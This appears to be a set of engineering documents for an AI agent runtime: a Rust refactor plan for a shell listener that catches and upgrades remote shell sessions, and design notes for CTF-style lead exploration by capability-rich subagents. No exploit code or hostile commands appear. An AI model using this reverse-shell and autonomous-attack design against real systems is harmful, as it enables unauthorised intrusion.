- vuluable의 `SHARED_CORE_SYNC.md`는 `../vulnerable`(RnDSecurity 모노레포 하위) sibling과의 동기화를 요구하는데, 그 sibling 디렉터리가 이 환경에는 존재하지 않아 이번 변경은 동기화하지 못했다. 원본 RnDSecurity 워크스페이스에 접근 가능해지면 `app/isolated/challenges.js`, compose 생성기, `scripts/verify-isolated-compose.js` 변경분을 반영해야 한다.

title: 2026-07-08 Codebase Modularization Refactor Plan
text:
## Purpose

This plan targets large-scale refactoring that preserves behavior while reducing code smell, coupling, and oversized module pressure. The goal is not to redesign runtime behavior. The goal is to move responsibilities to clearer modules, add consistency gates where drift is likely, and keep each step small enough to verify and revert.

## Current Findings

Repository shape from the July 8, 2026 survey:

- Total tracked source surface inspected: 955 files.
- Rust source files: 575.
- Rust/source/script/docs line count in the scanned surface: about 227,820 lines.
- Workspace crates: 26.
- Largest pressure files:
  - `crates/builder_main/src/shell_listener.rs`: 7,523 lines.
  - `crates/builder_ratatui/src/backend.rs`: 4,573 lines.
  - `crates/builder_app/src/operation.rs`: 3,227 lines.
  - `crates/builder_domain/src/tools/catalog.rs`: 3,074 lines.
  - `crates/builder_main/src/turn_runtime.rs`: 2,645 lines.
  - `crates/builder_app/src/tool_executor.rs`: 2,581 lines.
  - `crates/builder_app/src/app.rs`: 2,600 lines.

The strongest code-smell clusters are:

- `shell_listener.rs` mixes runtime startup, TUI event rendering, control request routing, pending run state, session projection, archive/recovery, and test fixtures in one file.
- `ToolCatalog` / `ToolOperation` variants are repeatedly matched across domain catalog, execution, formatting, summarization, file tracking, and compaction paths.
- `services.rs` is a broad service facade with many forwarding impls, making service ownership and dependency boundaries hard to see.
- Provider DTO conversion code repeats request/response/reasoning/tool-call mapping patterns across OpenAI, Anthropic, Google, Bedrock, and OpenAI Responses paths.
- Several tests are embedded inside very large production files, increasing navigation and merge-conflict cost.

## Non-Negotiables

- Preserve behavior and public CLI/API contracts.
- Prefer file moves and responsibility extraction over semantic rewrites.
- Keep every phase buildable and testable.
- Add or update consistency checks when a refactor creates a new architectural boundary.
- Avoid broad “cleanups” that mix unrelated concerns.
- Keep commits reviewable: one responsibility per commit, even inside a large plan.


This is the highest-value track. It addresses the largest single file and directly supports PTY/session-control reliability.



- Validate listener args.
- Start accept/control loops.
- Choose TUI vs event-log runtime.
- Wire a `SessionRegistry`.
- Re-export or connect shell-session command handling.

Proposed module layout:

- `shell_listener/mod.rs`
- `shell_listener/runtime_entry.rs`
- `shell_listener/event_log.rs`
- `shell_listener/tui.rs`
- `shell_listener/events.rs`
- `shell_listener/registry/mod.rs`
- `shell_listener/registry/control_dispatch.rs`
- `shell_listener/registry/pending_runs.rs`
- `shell_listener/registry/session_projection.rs`
- `shell_listener/registry/archive_recovery.rs`
- `shell_listener/operator_command.rs`
- `shell_listener/probe.rs`
- `shell_listener/write_audit.rs`
- existing modules retained: `accept`, `archive`, `control`, `control_socket`, `fd_budget`, `ledger`, `local_pipe`, `local_process`, `local_pty`, `pending`, `prompt_detect`, `reader`, `runtime`, `selector`, `session`, `terminal`, `transcript`, `writer`.


Scope:

- Move `OperatorCommand`, `CommandOutcome`, and `parse_operator_command` to `operator_command.rs`.
- Move sentinel helpers to `pending_runs.rs` or `sentinel.rs`.
- Move signal parsing and transcript direction parsing to small modules if they are not already owned elsewhere.
- Move `ProbeResult`, `probe_command`, upgrade-helper resolution wrappers, and missing-technique parsing to `probe.rs`.

Why first:

- Mostly pure functions and small enums.
- Low runtime risk.
- Establishes module boundaries before touching mutable session state.

Validation:

- `cargo test -p builder_main shell_listener::tests::python3_technique_wire_bytes_are_pinned`
- `cargo test -p builder_main shell_listener`
- `npm run consistency`

Consistency gate:

- Require operator command parser to live in `shell_listener/operator_command.rs`.
- Require probe/upgrade helper resolution to live outside `shell_listener.rs`.


Scope:

- Move `ListenerEvent` and constructors into `events.rs`.
- Keep event payload shape unchanged.
- Adjust accept/reader/writer imports to use the new module.
- Keep serialization/logging behavior unchanged.

Why second:

- `ListenerEvent` is the seam between accept loops, readers, writers, and registry.
- Extracting it makes later registry split cleaner.

Validation:

- `cargo test -p builder_main shell_listener`
- `cargo test -p builder_main --test shell_session_e2e`
- `cargo test -p builder_services session_backend`

Consistency gate:

- Check that `ListenerEvent` is defined in `events.rs`.
- Check writer failures still carry `WriteFailureAudit`.


Scope:

- Move `control_session`, `control_sessions`, `lifecycle_session`, `ok_with_sessions`, `ok_with_session`, and `ok_with_output_and_sessions` into `registry/session_projection.rs`.
- Keep `ControlResponse` construction centralized.
- Preserve JSON response shape.

Why third:

- Read-only projection logic is lower risk than write/control mutation.
- This reduces the size of `SessionRegistry` before state-machine extraction.

Validation:

- `cargo test -p builder_main shell_listener_control_lists_sessions_as_json_ready_state`
- `cargo test -p builder_main shell_listener_lifecycle_reports_session_metadata_without_output`
- `cargo test -p builder_main shell_listener_control_health_includes_session_projection`
- `cargo test -p builder_main shell_listener_control_sessions_are_sorted_by_id`
- `npm run verify`

Consistency gate:

- Require lifecycle/control-session projection helpers to live under `registry/session_projection.rs`.


Scope:

- Move evidence manifest structs and orphan recovery into `registry/archive_recovery.rs`.
- Move archive path helpers and dry-run helpers into archive/recovery modules.
- Keep archive file names, evidence JSON fields, and snapshot behavior unchanged.

Why fourth:

- Archive/recovery logic is behavior-heavy but isolated from live writes.
- It currently adds a large amount of persistence concern to the registry core.

Validation:

- `cargo test -p builder_main shell_listener_writes_evidence_manifest_and_recovers_orphaned_sessions`
- `cargo test -p builder_main shell_listener_control_gc_archives_closed_sessions`
- `cargo test -p builder_main shell_listener_control_gc_prunes_old_archived_sessions`
- `cargo test -p builder_main shell_listener_writes_sessions_snapshot_json`

Consistency gate:

- Require evidence manifest structs to live outside `shell_listener.rs`.
- Require snapshot recovery and evidence recovery tests to remain present.


Scope:

- Move `begin_pending_run`, `complete_pending_run`, `fail_pending_runs_for_session`, sentinel detection, pending timeout behavior, and probe/upgrade result interpretation into `registry/pending_runs.rs`.
- Keep `PendingRun` type in the current `pending` module unless ownership becomes clearer.
- Preserve command ledger and transcript side effects.

Why fifth:

- This is the riskiest shell-listener refactor.
- By this phase, helper/projection/archive code is already out of the way.

Validation:

- `cargo test -p builder_main shell_listener_fake_tcp_session_exercises_core_control_ops_end_to_end`
- `cargo test -p builder_main shell_listener_control_run_completes_on_sentinel`
- `cargo test -p builder_main shell_listener_control_run_times_out`
- `cargo test -p builder_main shell_listener_control_session_is_busy_while_run_pending`
- `cargo test -p builder_main shell_listener_tui_pty_upgrade_uses_control_plumbing`
- `cargo test -p builder_main --test shell_session_e2e`

Consistency gate:

- Require pending-run lifecycle helpers to live in `registry/pending_runs.rs`.
- Require run/probe/upgrade tests to remain present.


Scope:

- Move `handle_control_request` and `handle_*_request` groups into `registry/control_dispatch.rs`.
- Group handlers by read-only, write-control, local-process, lifecycle, and archive.
- Keep `SessionRegistry` as the owner of state, but move method implementations into dedicated modules.

Why sixth:

- This is the largest mechanical move.
- It should happen only after smaller seams are proven.

Validation:

- `cargo test -p builder_main shell_listener`
- `cargo test -p builder_main --test shell_session_e2e`
- `cargo test -p builder_main --test pty_smoke`
- `npm run verify`

Consistency gate:

- Require `handle_control_request` to be implemented outside `shell_listener.rs`.
- Require `shell_listener.rs` to stay below a target line budget after extraction.


This track reduces repeated `ToolCatalog` / `ToolOperation` match arms.


Tool metadata that is currently scattered across execution, formatting, compact summaries, file tracking, and policy should be represented through a domain-level descriptor table or trait-like metadata functions.

Candidate shape:

- `ToolKindMetadata`
- `ToolKind::name()`
- `ToolKind::execution_group()`
- `ToolKind::repeat_guard_enabled()`
- `ToolKind::default_defer_loading()`
- `ToolKind::requires_prior_read()`
- `ToolKind::summary_category()`


Scope:

- Move repeat guard, interaction/file/execution/meta grouping, and defer-loading decisions out of `tool_executor.rs`.
- Add `ToolKind` or `ToolCatalog` methods in domain/app boundary as appropriate.
- Keep execution code unchanged.

Validation:

- `cargo test -p builder_app tool_executor`
- `cargo test -p builder_domain tools`
- `npm run consistency`


Scope:

- Replace `ToolOperation` name match in `tool_executor.rs` with a method on `ToolOperation` or a shared descriptor.
- Align names used in large-output artifacts, summaries, and display.

Validation:

- `cargo test -p builder_app operation::tests`
- `cargo test -p builder_app tool_executor`
- `npm run verify`


Scope:

- Keep `fmt_input.rs` and `fmt_output.rs`, but extract reusable builders for path/action/JSON summaries.
- Avoid changing user-visible strings unless snapshots are deliberately updated.

Validation:

- `cargo test -p builder_app fmt`
- snapshot checks if applicable.


`crates/builder_app/src/services.rs` is a broad facade with many traits and forwarding impls.


Split service definitions into modules:

- `services/provider.rs`
- `services/config.rs`
- `services/conversation.rs`
- `services/filesystem.rs`
- `services/session.rs`
- `services/security.rs`
- `services/workspace.rs`
- `services/mcp.rs`
- `services/mod.rs`

Keep the top-level `Services` trait as a composition point, but move trait definitions and forwarding impls into their concern modules.

### Execution Plan

- Move pure trait definitions first.
- Move forwarding impls second.
- Keep re-exports stable from `services/mod.rs`.
- Add consistency gate that prevents `services.rs` from regrowing into a monolith.

Validation:

- `cargo check -p builder_app`
- `cargo check -p builder_services`
- `cargo test -p builder_app services`
- `npm run verify`


Provider mapping is large and duplicated across request/response conversions.


- Shared reasoning detail mapping helpers.
- Shared tool-call conversion helpers.
- Shared usage/cost conversion helpers where provider semantics allow it.
- Provider-specific modules keep only API-specific details.

Initial targets:

- `builder_provider_repo/src/provider/openai_responses/request.rs`
- `builder_provider_repo/src/provider/openai_responses/response.rs`
- `builder_provider_repo/src/provider/bedrock/converters.rs`
- `builder_app/src/dto/openai/response.rs`
- `builder_app/src/dto/anthropic/response.rs`

Validation:

- `cargo test -p builder_provider_repo openai_responses`
- `cargo test -p builder_provider_repo bedrock`
- `cargo test -p builder_app dto`

## Guardrail Strategy

Every phase should include at least one guardrail:

- A consistency check for structural boundaries.
- A targeted Rust test for behavior.
- A line-budget check for files being decomposed.
- A required test-name check for high-risk behavior.

Suggested initial line budgets:

- `shell_listener.rs`: below 6,000 after phases 1-2.
- `shell_listener.rs`: below 2,500 after phases 5-6.
- `tool_executor.rs`: below 2,000 after classification/name extraction.

## Execution Order

Recommended order:

1. Shell listener Phase 1: pure helper extraction.
2. Shell listener Phase 2: listener event boundary.
3. Shell listener Phase 3: projection and response builders.
4. Tool plumbing Phase 1: centralize classifications.
5. Shell listener Phase 4: archive/recovery boundary.
6. Shell listener Phase 5: pending run state machine.
7. Shell listener Phase 6: control dispatch split.
8. Service facade split.
9. Provider DTO conversion pipeline.


## Commit Policy

- One phase may require multiple commits.
- Commit after each passing targeted test set.
- Push after each phase or after any commit that materially reduces risk.
- Do not combine shell-listener state-machine work with provider/tool/service work.


Minimum for every phase:

- `cargo fmt`
- `cargo check -p <affected_crate>`
- Targeted Rust tests for changed module.
- `npm run consistency`
- `git diff --check`

For shell-listener phases:

- `cargo test -p builder_main shell_listener`
- `cargo test -p builder_main --test shell_session_e2e`
- `cargo test -p builder_main --test pty_smoke` for PTY/pending-run phases.

For app/tool phases:

- `cargo test -p builder_app tool_executor`
- `cargo test -p builder_app operation::tests`
- `npm run verify`

For provider phases:

- `cargo test -p builder_provider_repo`
- Provider-specific DTO tests.

## Risk Register

- Shell listener pending-run extraction can subtly change timeout, sentinel, transcript, and ledger ordering. Mitigation: keep tests before/after, avoid semantic edits, extract helpers first.
- Moving event types can create visibility churn across modules. Mitigation: introduce `events.rs` with `pub(super)` exports and keep payload shape unchanged.
- Tool metadata centralization can accidentally alter policy or defer-loading behavior. Mitigation: snapshot old classifications in tests before replacing match arms.
- Service facade split can cause import churn. Mitigation: keep stable re-exports and move one concern at a time.
- Provider DTO helper sharing can over-abstract provider-specific behavior. Mitigation: only share low-level mapping primitives, not provider policy.


Start with `shell_listener` Phase 1.

Files likely touched:

- `crates/builder_main/src/shell_listener.rs`
- `crates/builder_main/src/shell_listener/operator_command.rs`
- `crates/builder_main/src/shell_listener/probe.rs`
- `crates/builder_main/src/shell_listener/sentinel.rs`
- `scripts/check-project-consistency.mjs`

Expected outcome:

- No behavior change.
- `shell_listener.rs` loses pure parsing/probe/sentinel helpers.
- Existing tests continue to pass.
- Consistency check prevents helpers from drifting back into the monolith.

## Progress Log

### 2026-07-08

- Shell listener phases 1-6: extracted events, operator command parsing, probe helpers, sentinel/signal helpers, registry projection, archive/recovery, pending-run state, and control dispatch into dedicated modules. Consistency gates now prevent these responsibilities from drifting back into `shell_listener.rs`.
- Shell listener remaining budget gap: `shell_listener.rs` is 5,915 lines after extraction, still above the target end-state budget of 2,500 lines. Runtime entry, event-log/TUI rendering, and command handling remain candidates for follow-up decomposition.
- Tool plumbing phase 1: centralized execution grouping, repeat-guard policy, deferred-loading defaults, and prior-read requirements on `ToolKind` / `ToolCatalog`; `tool_executor.rs` now consumes the domain classification API instead of owning local policy match arms.
- Tool plumbing phase 2: moved `ToolOperation` wire-name mapping from `tool_executor.rs` into `ToolOperation::tool_name()` and added a consistency gate preventing name mapping from drifting back into the executor.
- Tool plumbing phase 3: moved JSON `ToolOutput` element/serialization builders into `operation/json_output.rs` and path/read-range title helpers into `fmt/tool_title.rs`; consistency gates now keep those rendering boundaries out of the larger `operation.rs` and `fmt_input.rs` files.
- Service facade split: reduced `crates/builder_app/src/services.rs` from the trait/output monolith to a thin 15-line module root, moving outputs, provider/auth traits, config/conversation traits, tool traits, workspace traits, HTTP client traits, and blanket `Services` delegation into `services/*.rs`. Downstream `builder_services`, `builder_api`, and `builder_main` checks pass with public re-exports preserved.
- Provider DTO conversion pipeline: moved OpenAI request conversion impls (`Context`, `ContextMessage`, `ToolResult`, tool-call argument normalization) into `dto/openai/request/conversion.rs`, keeping DTO structs in `request.rs` and provider policy untouched. README wording was shortened and updated with the current internal layout.
- Shell listener follow-up: moved event-log and TUI runtime loops into `shell_listener/runtime_entry.rs`, leaving `shell_listener.rs` focused more tightly on listener startup, registry ownership, and control/session state. Consistency now requires the runtime-entry boundary and keeps `shell_listener.rs` below 5,800 lines as the next budget checkpoint.
- Shell listener write-audit follow-up: moved command ledger entry construction, command-id generation, write-failure audit recording, and control transcript append helpers into `shell_listener/write_audit.rs`. JS guard changes were kept thin: declare the module, lower the line budget, and include the new file in the existing writer-failure plumbing checks.

title: Decision Record — CTF Frontier Exploration: how much runtime, how much model
text:
**Date:** 2026-07-08
**Status:** Accepted
**Scope:** Chooses the architecture for the CTF exploration upgrade before implementation.
**Links:**
- Implementation plan: [`PLAN_CtfFrontierExploration_2026-07-08.md`](./PLAN_CtfFrontierExploration_2026-07-08.md) (revised to reflect this decision)
- Grounded code map is embedded in the plan's "Current State" section.

---


The request: make CTF exploration less naive — enumerate broadly, go deep on a lead, come back out and go wide when a lead dies, dig again elsewhere (BFS↔DFS with backtracking); and when a heavy independent lead appears (crypto/rev/pwn), hand it off and keep working. Also: broad-clone subagents with persona-as-overlay; resource safety; UI/UX; final tests.

The first draft plan delivered all of that — but during a "simple is best" review it became clear the draft put the **heaviest, riskiest complexity in the wrong layer**. This record fixes the direction before a (possibly weaker) model implements it.

---


**Complexity should be minimized, and what remains should live in the safest layer.** Ranked from safest to most dangerous to own:

1. **Pure functions over data** (deterministic, unit-testable, no state) — cheapest to get right and to debug.
2. **Persistent state / typed records** — testable via round-trips.
3. **Prompt/doctrine + model behavior** — flexible, but non-deterministic.
4. **Concurrency & task lifecycle** (detached tasks, cancellation, guards, interrupts) — the most expensive to debug, the place bugs hide, the place "works on my machine" lives.

A design is well-placed when its hard parts sit in layers 1–2 and it spends as little as possible in layer 4.

---


Just improve the CTF prompt. **Rejected:** the user already judged this "too simple." No persistent structure, no dedup, no enforced pivot — the model re-walks ground and forgets leads across turns.

The runtime owns a **persistent, deduplicated lead frontier** and enforces **hard rules** (auto-exhaust after 2 dead probes, dedup, size/depth caps). It also computes a **pure advisory recommendation** ("breadth: expand these 3 siblings"; "lead X is exhausted — pivot"; "best next dive: Y") and injects it into the model's context. The **model still issues `task`/`explore` calls** — it decides order, informed by structured state and the recommendation.

- Layer-4 spend: ~zero beyond what exists today (the model's own parallel `task` fan-out).


- Complexity lands in: a second scheduler **and** detached-task lifecycle (layer 4) — precisely the most dangerous layer.
- Two schedulers (the model's agent loop and the runtime's traversal loop) can fight each other; interrupts, teardown, and partial-failure become genuinely hard.

B delivers the same *observable behavior the user asked for* (structured breadth/depth discipline, pivots, offload-and-continue) while keeping the model — which is already good at deciding what to probe next — in the driver's seat. It moves the clever part (the BFS/DFS/backtrack logic) into a **pure advisory function that is still fully unit-tested**, and it **deletes the second control loop and the detached-task machinery** that made C risky. C's determinism is not worth a second scheduler and a class of concurrency bugs, especially for a weaker implementing model. **We keep C's elegant `decide_next` algorithm — demoted from "driver" to "advisor."** Best of both: smart pure code, no risky control loop.

---

## 4. Sub-decisions

- **Inline-parallel** — issue the crypto `task` in the *same turn* alongside other probes; they run concurrently and the turn proceeds. **This already exists** (the model fans out parallel `task` calls today). Zero new async machinery.
- **Detached-across-turns** — crypto runs in a background task for many turns while the main agent does unrelated reasoning; results reaped later. Genuinely more powerful, but requires detached `tokio::spawn`, a task registry, an RAII cancellation guard, interrupt handling, panic isolation — the single riskiest slice of the whole design.

**Chosen:** ship **inline-parallel** (satisfies "do other work in parallel"), and document **detached-across-turns as an optional future phase behind its own sub-flag**, to be built only if profiling shows crypto/rev leads genuinely starve the main line for many turns. Rationale: appropriate-complexity-placement — do not pay layer-4 cost for a capability we have not shown we need, especially with a weak implementer.

The first draft added three `ControlPlaneRepository` methods → a **workspace-wide trait break** (three impls must all change) and a new persistence surface.

**Chosen:** model leads as a new `EvidenceKind::Lead` on the **existing** evidence blackboard (already persisted via `append_evidence_item`/`list_evidence_items` — no trait change, no 3-impl break). Lead state transitions are append-only events; the frontier is a **fold** over `Lead` evidence (latest event per `node_id` wins). Dedup and the 2-dead-probe pivot are enforced at write/fold time. This removes an entire risky migration and reuses machinery that already round-trips and survives across turns.

Kept. Children are broad clones of the parent profile with the category as a prompt overlay (`DynamicAgentOverlay`), never a capability-stripped specialist. This was already decided and remains correct; it also makes B simpler because a broad child can post its own leads via `explore`.

Ship the **model-facing frontier line** in the mission-control note (essential — it is how the model sees the frontier), the **`/frontier` operator command**, and a **one-line status-row summary**. Treat live per-event glyph rendering as **optional polish**, not a blocker. Rationale: the user asked for UI/UX, but the minimum that delivers the value is "the operator can see the frontier and the model is told about it."

---


| Piece | First draft | Verdict | Final |
| --- | --- | --- | --- |
| Frontier state | New domain type + 3-impl trait break | Over (layer-2 migration risk) | Reuse evidence blackboard (`EvidenceKind::Lead`) |
| BFS/DFS logic | Pure `decide_next` driving a scheduler loop | Right idea, wrong role | Keep pure fn as **advisor**; drop the loop |
| Offload | Detached tasks + registry + RAII guard + semaphore rework + interrupt edges | Over (heavy layer-4 spend for one feature) | Inline-parallel now; detached deferred behind a flag |
| Broad clone + overlay | Overlay hint, no capability subtraction | Right, minimal | Unchanged |
| Config flag / caps | Default-off flag + bounded structures | Right, minimal | Unchanged |
| UI/UX | Status row + `/frontier` + live glyphs | Slightly over | Keep first two; glyphs optional |
| Guardrails (pivot/dedup/cap) | Runtime-enforced | Right, essential | Unchanged (now enforced at fold time) |

Net effect: the design keeps every behavior the user asked for, deletes the second control loop and the detached-task lifecycle, removes a workspace-wide persistence migration, and relocates the remaining cleverness into pure, testable code. **Minimum necessary complexity, placed in layers 1–2, not layer 4.**

---

## 6. Consequences

**We ship (B):** persistent deduplicated frontier on the evidence blackboard; the `explore` tool; a pure `decide_next` **advisor** feeding the mission-control note; runtime-enforced pivot/dedup/caps; broad-clone + overlay children; inline-parallel offload; config flag (default off); resource caps; `/frontier` + status-row UI; full E2E + off-flag regression.

**We defer (documented, not built):**
- Detached-across-turns offload (Phase 5b, own sub-flag) — only if measured.
- Runtime-as-scheduler (Option C's driving loop) — the `explore` tool + advisor are forward-compatible with promoting the advisor to a driver later without reworking state, if the model ever proves unable to follow the recommendation.

**Reversibility:** the feature flag makes the whole thing a no-op when off. Every deferred item is an additive escalation, not a rewrite — so choosing B now does not foreclose C later.

**Order of implementation:** follow the plan's "Dependency order & merge points". Phases are numbered and must be executed in that order; the flag is enabled only after the final E2E phase is green.

title: CTF Frontier-Guided Exploration (BFS/DFS + Specialist Offload) Implementation Plan
text:
> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Date:** 2026-07-08
**Author:** planning session (grounded in current `main`)
**Direction:** **Guided Frontier (Option B)** — see the decision record [`DECISION_CtfFrontierExploration_2026-07-08.md`](./DECISION_CtfFrontierExploration_2026-07-08.md) for the options considered (A doctrine-only / B guided / C runtime-scheduler) and why B was chosen. Read the decision record first; it is the "why" behind every simplification below.

> **What changed from the first draft (per the decision record):** the runtime does **not** run a second scheduler loop and does **not** spawn detached background tasks. The clever BFS/DFS/backtrack logic stays as a **pure advisor function** whose recommendation is injected into the model's context; the **model still drives** via `task`/`explore`. Offload is **inline-parallel** (same-turn fan-out that already exists), with detached-across-turns deferred behind a sub-flag. Frontier state reuses the **existing evidence blackboard** (no new persistence trait surface). These moves keep every requested behavior while removing the riskiest concurrency and migration work.

**Goal:** Replace today's flat, one-shot subagent fan-out with a **persistent, deduplicated lead frontier** that the runtime **guards** (auto-pivot after two dead probes, dedup, size/depth caps) and **advises** on (a pure BFS↔DFS + backtracking recommendation injected into context), while the **model drives** exploration via `explore`/`task`. Deep-specialist leads (crypto/rev/pwn) are worked **in parallel in the same turn** so the main line keeps moving, and child findings merge back into the shared frontier so ground is never re-walked.

**Architecture:** Domain-neutral, behind the existing `execution_strategy_builder.rs` seam. A new `ExecutionStrategyKind::Explore` selects it for CTF/Investigate task shapes when the feature flag is on. Frontier state is **`EvidenceKind::Lead` events on the existing evidence blackboard** (persisted through the current `append_evidence_item`/`list_evidence_items` — no new trait methods), so it survives turns and delegation boundaries. The **model proposes leads and reports outcomes** via a new `explore` tool; the **runtime enforces hard rules and computes a pure advisory recommendation** — consistent with the "runtime-owned adjudication" pillar in `ARCHITECTURE.md`, but keeping the model as the scheduler it already is.

**Tech Stack:** Rust (workspace crates `builder_domain`, `builder_app`, `builder_repo`), `tokio` (delegation concurrency), existing `ControlPlaneRepository` persistence, existing `task`/delegation executor.

---

## Global Constraints

- **Domain-neutral core.** No CTF strings baked into `builder_domain`/`builder_app` engine types. CTF wiring stays in skills, engagement context, and doctrine text — per `ARCHITECTURE.md` ("Builder is a domain-neutral runtime").
- **Runtime owns order; model owns content.** The model may *add* leads and *report* outcomes; it must not be the scheduler. Traversal decisions are deterministic Rust (`decide_next` is a pure function).
- **Broad clone by default, persona as overlay.** Exploration children are full-capability clones of the parent's dynamic profile plus `explore`; category personas are prompt overlays, never capability subtractions. Narrowing (read-only, single-purpose) is opt-in per task via the existing `synthesize_delegation_profile` seam, not the default. Guardrails (caps/gates/proof) — not tool-stripping — keep broad clones safe.
- **Fail-closed budgets, no new concurrency.** Existing caps stay authoritative: `MAX_DELEGATION_DEPTH = 2` (`agent_executor.rs:23`), `MAX_PARALLEL_DELEGATED_TASKS = 4` (`agent_executor.rs:22`), per-turn budgets in `app/runtime_budget.rs` (`Ctf => (10,5)`). The shipped design adds **no** new concurrency primitive — every exploration child rides the existing `run_delegated_tasks` fan-out and its existing semaphore.
- **Persistence-first.** Every new stateful concept is a `ControlPlaneRepository` record keyed by `RunId`, with an in-memory impl and round-trip tests, matching `Objective`/`EvidenceItem`/`AgentTask`.
- **No behavior change unless `Explore` strategy is active.** Existing `Conversation`/`Task`/`Delegate` strategies must be byte-for-byte unaffected; guard every new path behind `ExecutionStrategyKind::Explore`.
- **TDD, DRY, YAGNI, frequent commits.** Each task ends green and is committed.

---


| Concern | Today | File |
| --- | --- | --- |
| Delegation | Flat, one-shot; `join_all` blocks until all children done | `tool_registry.rs:341-380` |
| Concurrency / depth caps | 4 parallel (per-parent semaphore), depth ≤ 2 | `agent_executor.rs:22-23,37-47` |
| Strategy selection | **Stub** — ignores routing, always `general_purpose()`/`permissive()` | `execution_strategy_builder.rs:43-48`; `execution_strategy.rs:164-173` |
| Strategy kinds | `Conversation, Task, Survey, Delegate, Review` | `execution_strategy.rs:13-27` |
| Findings blackboard | `EvidenceItem{kind:Finding}`, **scoped to `run_id`** (not shared across delegation) | `tool_executor.rs:935-1010`; `control_plane.rs:637-661` |
| Leads / branches | `Objective` + `ObjectiveLink{SpawnedFrom, DependsOn}` (audit edges, not traversed) | `control_plane.rs:527-603` |
| Phase FSM | `Discover/Plan/Retrieve/Execute/Verify/Report`, model-driven | `control_plane.rs:63-110`; `orch/phase_manager.rs:38` |
| CTF strategy | **Prose only** in `ctf_operating_doctrine()`; "Parallel Challenge Board" is a text convention | `system_prompt.rs:497-517`; `skills/ctf-competition/SKILL.md` |
| Specialist agents | recon/web/pwn/crypto/rev/forensics **cannot delegate** (no `task` tool) | `agent.rs:248-282` |
| Consolidation | String-concat of child's last markdown + `AgentTask` proof rows | `agent_executor.rs:403-476` |

**Conclusion the plan acts on:** there is no frontier, queue, tree, DFS/BFS, or backtracking anywhere in the runtime; delegation is a depth-2, ≤4-wide blocking fan-out driven by an LLM classifier + in-loop `task` calls; child findings never flow back structurally. The `execution_strategy_builder.rs` stub and the `Objective`/`ObjectiveLink` types are the intended seams to build on.

---


### Lead graph
A **lead** is a candidate line of attack (a service, an endpoint, a file, a cipher, an offset). Leads form a directed graph rooted at the initial recon node:

- **Node** = `ExplorationNode` (new domain type). State ∈ `{Frontier, Exploring, Deepening, Exhausted, Offloaded, Blocked, Solved}`.
- **Edge** = parent→child expansion (a lead discovered *while working* another lead). Reuses `ObjectiveLink{SpawnedFrom}` semantics but on exploration nodes.
- **Score** = priority signal (category weight × freshness × cheapness-of-probe), used to pick "most promising" next.

Deterministic policy computed by `decide_next(nodes, cursor, max_breadth) -> TraversalDecision` (the current `mode` lives **inside** `cursor`, not a separate arg):

1. **Initial breadth (BFS root).** First action on a run is *enumerate*: expand all root-level leads in parallel (one child agent each, capped at 4). Matches existing doctrine "Enumerate exhaustively before exploiting."
2. **Per-lead depth (DFS).** Each discovered lead is handed to an **individual agent** that goes deep on **one hypothesis at a time** (`Deepening`).
3. **Breadth on new children (BFS).** If deepening a node surfaces sub-leads, those siblings are expanded breadth-first at the new level before descending further.
4. **Backtrack on dead-end.** A node reaching `dead_probes >= PIVOT_THRESHOLD (=2)` (encodes the existing "two dead probes → pivot" rule) is marked `Exhausted`; the cursor **backtracks to the parent** and switches to **Breadth** over remaining siblings.
5. **Re-descend (DFS again).** When siblings at a level are exhausted, switch back to **Depth** and jump to the **global best `Frontier` node** (best-first re-seed) — i.e. come back out, go wide, then dive again, exactly as described.
6. **Terminate / escalate.** No `Frontier` nodes and no `Exploring`/`Offloaded` in flight ⇒ `Done`; if unsolved with blocked leads ⇒ `Escalate`.

This is **iterative-deepening best-first search with backtracking**, where `mode` oscillates `Breadth ↔ Depth` per rules 3–5. The policy is a **pure function** (no I/O) so it is exhaustively unit-testable.

When a lead's category is a **deep-specialist** category (`Crypto`, `Rev`, `Pwn`) **and** it has no unresolved dependency on the current branch, the controller marks it `Offloaded` and **dispatches a dedicated background subagent** — a broad clone carrying that category's focus overlay (per the adopted decision, not a capability-stripped persona) — *without blocking the frontier*. The main traversal keeps going on other leads; the offloaded result is reaped on a later turn and merged. This requires a **non-blocking (fire-and-track)** delegation path — today `run_delegated_tasks` blocks on `join_all`.

- **Down:** when a child is spawned for a lead, it is **seeded** with the parent's confirmed facts relevant to that lead (a compact evidence digest), so children don't re-recon.
- **Up:** on child completion, its `finding`-tool evidence (via `AgentTask.evidence_refs`) is **promoted** into the parent's exploration graph as new `Frontier` nodes and confirmed facts.

This closes the current gap where `EvidenceItem{Finding}` is `run_id`-scoped and invisible across the delegation boundary.


The runtime already clones the whole engine per child — `AgentExecutor::execute` builds a **fresh `BuilderApp`** (classifier + strategy + adjudication included), not a stripped helper. We lean into that instead of fighting it:

- **Default exploration child = a broad clone of the parent's dynamic profile**, not a narrowed specialist. It inherits the parent's tool scope (read/shell/fetch/write as the parent has) **plus `explore`** (and `task` where depth budget allows), so every lead is worked by a *full-capability explorer* that can itself surface and post new leads.
- **Category personas (`web`/`crypto`/`rev`/`pwn`/`forensics`/`recon`) become overlay hints, not hard tool cages.** The category is injected as a focus overlay into the child's system prompt ("you are focusing on the crypto lead `<title>`; here are the confirmed facts") via the existing `DynamicAgentOverlay` on `DelegationContext` (`chat_request.rs:150-162`) — it does **not** subtract capabilities. A child that needs an unexpected tool still has it.
- **Narrowing is opt-in per task, not the default.** When a lead genuinely wants a read-only or single-purpose child (e.g. a pure verification pass), the dispatcher requests that by setting `tool_scope=ReadOnly`/a tight `TaskShape` in the synthesized profile — the same `synthesize_delegation_profile` seam (`agent_executor.rs:89-141`) that exists today. Default is broad; narrow is the exception.
- **Runtime-owned guardrails stay authoritative regardless of breadth.** Depth/parallel caps, completion gates, and delegation proof are what make a broad clone safe; they are never relaxed to widen capability. Breadth is bounded by *budget and caps*, not by *lobotomizing the child*.

Rationale: a broad clone lets a lead recursively decompose into its own sub-leads (the frontier's whole point), removes the current foot-gun where the crypto specialist can't even post a follow-up lead, and keeps one code path. The cost of breadth (heavier prompt/tool schema per child) is paid only for leads that are actually dispatched, and is capped by the same budget that bounds a narrow child.

### Module layout
```
crates/builder_domain/src/exploration.rs         (new: types + traversal-policy pure fns)
crates/builder_app/src/orch/exploration/
    mod.rs
    frontier.rs      (event-sourced fold over Lead evidence + graph ops)
    dispatcher.rs    (explore op=dispatch → enriched parallel fan-out)
    advisor.rs       (format decide_next's recommendation for the note)
    merge.rs         (seed digest down + promote child findings up)
    (decide_next itself lives in builder_domain/src/exploration.rs — pure, domain)
